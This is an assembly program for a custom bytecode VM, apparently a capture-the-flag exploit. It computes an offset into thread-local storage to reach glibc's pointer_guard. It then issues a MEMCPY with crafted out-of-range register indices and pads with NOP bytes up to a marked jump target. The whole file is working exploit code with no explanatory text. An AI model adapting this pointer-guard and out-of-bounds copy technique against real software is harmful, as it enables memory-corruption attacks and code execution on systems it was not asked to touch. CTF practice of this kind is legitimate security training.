%include "vm.inc"

PUSH_IMM 0x6

; prepare address of pointer_guard





; -0x1ea8b0, point to tls

PUSH_IMM 0x1e
POP_REG 0

PUSH_IMM 8
POP_REG 1

SHL 0, 1


PUSH_IMM 0xa8
POP_REG 2
ADD 0, 2

SHL 0, 1


PUSH_IMM 0xb0
POP_REG 2
ADD 0, 2


MOV_REG_REG 4, 6
SUB 4, 0




PUSH_REG 4
PUSH_REG 4
PUSH_REG 7
PUSH_IMM 0x61
PUSH_IMM 0
PUSH_IMM 0x13

PUSH_IMM 255
POP_REG 1

PUSH_IMM 0xf7
POP_REG 2

MEMCPY 1, 2, 0x51


; jump here after memcpy
times (0x60 - ($ - $$)) db 0x90

PUSH_IMM 0
